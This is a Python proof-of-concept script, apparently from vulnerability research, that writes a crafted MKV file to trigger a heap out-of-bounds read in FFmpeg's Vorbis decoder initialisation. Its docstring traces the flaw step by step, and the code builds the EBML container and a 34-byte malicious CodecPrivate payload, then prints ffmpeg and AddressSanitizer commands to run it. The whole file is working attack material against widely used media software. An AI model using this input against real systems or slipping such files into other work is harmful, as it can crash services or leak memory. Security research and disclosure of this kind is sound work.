#!/usr/bin/env python3
"""
PoC generator for VULN 001: Heap OOB Read in oggvorbis_decode_init()
File: libavcodec/libvorbisdec.c, lines 54-67
CWE: CWE-125 (Out-of-bounds Read)

Vulnerable code path (libvorbisdec.c lines 54-67):
  if(p[0] == 0 && p[1] == 30) {
      int sizesum = 0;
      for(i = 0; i < 3; i++){
          hsizes[i] = bytestream_get_be16((const uint8_t **)&p);
          sizesum += 2 + hsizes[i];
          if (sizesum > avccontext->extradata_size) { ... goto error; }
          headers[i] = p;
          p += hsizes[i];
      }
  }

Trigger trace with extradata = [0x00,0x1E, <30 bytes>, 0x00,0x00], size=34:
  - p starts at extradata[0]; p[0]==0 and p[1]==30 (0x1E) → enters branch
  - i=0: bytestream_get_be16 reads extradata[0..1]=0x001E=30 → hsizes[0]=30
          p advances to extradata+2; sizesum=0+2+30=32
          guard: 32 > 34? NO → continue
          headers[0]=extradata+2; p+=30 → p=extradata+32
  - i=1: bytestream_get_be16 reads extradata[32..33]=0x0000=0 → hsizes[1]=0
          p advances to extradata+34; sizesum=32+2+0=34
          guard: 34 > 34? NO (not strictly greater) → continue
          headers[1]=extradata+34; p+=0 → p=extradata+34
  - i=2: bytestream_get_be16 reads extradata[34..35] → OOB!
          extradata_size=34, so valid range is [0..33]

Strategy: Embed malicious extradata as MKV CodecPrivate for A_VORBIS.
The matroska demuxer passes CodecPrivate directly as extradata to libvorbisdec.c
with no transformation for Vorbis codec (no special offset or repackaging).
"""

import struct
import os
import sys


# ---------------------------------------------------------------------------
# EBML encoding helpers
# ---------------------------------------------------------------------------

def vint_size(value: int) -> bytes:
    """Encode an integer as an EBML variable-size integer (for data sizes)."""
    if value < 0x7F:
        return bytes([0x80 | value])
    elif value < 0x3FFF:
        return struct.pack('>H', 0x4000 | value)
    elif value < 0x1FFFFF:
        b = struct.pack('>I', 0x200000 | value)
        return b[1:]  # 3 bytes
    elif value < 0x0FFFFFFF:
        return struct.pack('>I', 0x10000000 | value)
    else:
        return struct.pack('>Q', 0x0100000000000000 | value)


def ebml_elem(elem_id: bytes, data: bytes) -> bytes:
    """Wrap data with an EBML element header (ID + VINT size)."""
    return elem_id + vint_size(len(data)) + data


def ebml_uint(elem_id: bytes, value: int) -> bytes:
    """Create an EBML unsigned integer element."""
    if value == 0:
        data = b'\x00'
    else:
        length = (value.bit_length() + 7) // 8
        data = value.to_bytes(length, 'big')
    return ebml_elem(elem_id, data)


def ebml_float32(elem_id: bytes, value: float) -> bytes:
    """Create an EBML 4-byte float element."""
    return ebml_elem(elem_id, struct.pack('>f', value))


def ebml_string(elem_id: bytes, value: str) -> bytes:
    """Create an EBML ASCII string element."""
    return ebml_elem(elem_id, value.encode('ascii'))


# ---------------------------------------------------------------------------
# MKV EBML element IDs
# ---------------------------------------------------------------------------
ID_EBML            = bytes.fromhex('1A45DFA3')
ID_EBML_VERSION    = bytes.fromhex('4286')
ID_EBML_READ_VER   = bytes.fromhex('42F7')
ID_EBML_MAX_ID     = bytes.fromhex('42F2')
ID_EBML_MAX_SIZE   = bytes.fromhex('42F3')
ID_DOCTYPE         = bytes.fromhex('4282')
ID_DOCTYPE_VERSION = bytes.fromhex('4287')
ID_DOCTYPE_READ    = bytes.fromhex('4285')
ID_SEGMENT         = bytes.fromhex('18538067')
ID_INFO            = bytes.fromhex('1549A966')
ID_TIMESTAMP_SCALE = bytes.fromhex('2AD7B1')
ID_TRACKS          = bytes.fromhex('1654AE6B')
ID_TRACK_ENTRY     = bytes.fromhex('AE')
ID_TRACK_NUMBER    = bytes.fromhex('D7')
ID_TRACK_UID       = bytes.fromhex('73C5')
ID_TRACK_TYPE      = bytes.fromhex('83')
ID_CODEC_ID        = bytes.fromhex('86')
ID_CODEC_PRIVATE   = bytes.fromhex('63A2')
ID_AUDIO           = bytes.fromhex('E1')
ID_SAMPLING_FREQ   = bytes.fromhex('B5')
ID_CHANNELS        = bytes.fromhex('9F')
ID_CLUSTER         = bytes.fromhex('1F43B675')
ID_TIMESTAMP       = bytes.fromhex('E7')
ID_SIMPLE_BLOCK    = bytes.fromhex('A3')


# ---------------------------------------------------------------------------
# Malicious extradata construction
# ---------------------------------------------------------------------------

def make_malicious_codec_private() -> bytes:
    """
    Build the 34-byte extradata payload that triggers the OOB read.

    Layout:
      [0x00]              → satisfies p[0] == 0
      [0x1E]              → satisfies p[1] == 30 (0x1E decimal = 30)
      [<30 bytes filler>] → consumed as header-0 content (hsizes[0]=30)
      [0x00, 0x00]        → hsizes[1]=0, consumed cleanly
      (no bytes 34-35)    → i=2 reads past end → OOB
    """
    buf = bytearray(34)
    buf[0] = 0x00          # triggers p[0] == 0
    buf[1] = 0x1E          # triggers p[1] == 30; also read as hsizes[0] high byte
    # bytes 2..31: filler for the 30 bytes that p skips after i=0
    for idx in range(2, 32):
        buf[idx] = 0x41    # 'A', arbitrary
    # bytes 32..33: hsizes[1] = 0x0000
    buf[32] = 0x00
    buf[33] = 0x00
    # deliberately NO bytes at index 34-35 — reading them is the OOB
    return bytes(buf)


# ---------------------------------------------------------------------------
# Minimal MKV file builder
# ---------------------------------------------------------------------------

def make_mkv() -> bytes:
    """Assemble a minimal MKV file with the malicious Vorbis CodecPrivate."""

    codec_private = make_malicious_codec_private()

    # Audio sub-element (SamplingFrequency + Channels)
    audio_elem = (
        ebml_float32(ID_SAMPLING_FREQ, 44100.0) +
        ebml_uint(ID_CHANNELS, 2)
    )

    # TrackEntry
    track_entry = (
        ebml_uint(ID_TRACK_NUMBER, 1) +
        ebml_uint(ID_TRACK_UID, 0xDEADBEEF) +
        ebml_uint(ID_TRACK_TYPE, 2) +           # 2 = audio
        ebml_string(ID_CODEC_ID, 'A_VORBIS') +
        ebml_elem(ID_CODEC_PRIVATE, codec_private) +
        ebml_elem(ID_AUDIO, audio_elem)
    )

    tracks = ebml_elem(ID_TRACKS, ebml_elem(ID_TRACK_ENTRY, track_entry))

    # Info (only mandatory TimestampScale)
    info = ebml_elem(ID_INFO, ebml_uint(ID_TIMESTAMP_SCALE, 1000000))

    # Minimal Cluster: timestamp=0 + one empty SimpleBlock
    # SimpleBlock wire format: track VINT + Int16 timecode + flags byte
    simple_block_payload = b'\x81' + b'\x00\x00' + b'\x00'  # track=1, time=0, flags=0
    cluster = ebml_elem(ID_CLUSTER,
        ebml_uint(ID_TIMESTAMP, 0) +
        ebml_elem(ID_SIMPLE_BLOCK, simple_block_payload)
    )

    # EBML header
    ebml_header = ebml_elem(ID_EBML,
        ebml_uint(ID_EBML_VERSION, 1) +
        ebml_uint(ID_EBML_READ_VER, 1) +
        ebml_uint(ID_EBML_MAX_ID, 4) +
        ebml_uint(ID_EBML_MAX_SIZE, 8) +
        ebml_string(ID_DOCTYPE, 'matroska') +
        ebml_uint(ID_DOCTYPE_VERSION, 4) +
        ebml_uint(ID_DOCTYPE_READ, 2)
    )

    # Segment with unknown size (0x01FFFFFFFFFFFFFF) so FFmpeg reads to EOF
    segment_content = info + tracks + cluster
    segment = ID_SEGMENT + b'\x01\xFF\xFF\xFF\xFF\xFF\xFF\xFF' + segment_content

    return ebml_header + segment


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    output_path = os.path.join(script_dir, 'vuln_001_input.mkv')

    mkv_data = make_mkv()

    with open(output_path, 'wb') as f:
        f.write(mkv_data)

    codec_priv = make_malicious_codec_private()
    print(f'[+] Output : {output_path} ({len(mkv_data)} bytes)')
    print(f'[+] CodecPrivate ({len(codec_priv)} bytes):')
    print(f'      hex: {codec_priv.hex()}')
    print(f'      [0]     = 0x{codec_priv[0]:02X}  (p[0]==0 trigger)')
    print(f'      [1]     = 0x{codec_priv[1]:02X}  (p[1]==30 trigger; BE16[0..1]=30=hsizes[0])')
    print(f'      [2:32]  = 30 filler bytes  (skipped after i=0)')
    print(f'      [32:34] = 0x{codec_priv[32]:02X}{codec_priv[33]:02X}  (hsizes[1]=0; p advances to byte 34)')
    print(f'      [34:36] = <past end>  → OOB read at i=2')
    print()
    print(f'[+] Run with:')
    print(f'      ffmpeg -i {output_path} -f null -')
    print(f'    or with AddressSanitizer:')
    print(f'      ASAN_OPTIONS=detect_leaks=0 ffmpeg -i {output_path} -f null -')


if __name__ == '__main__':
    main()
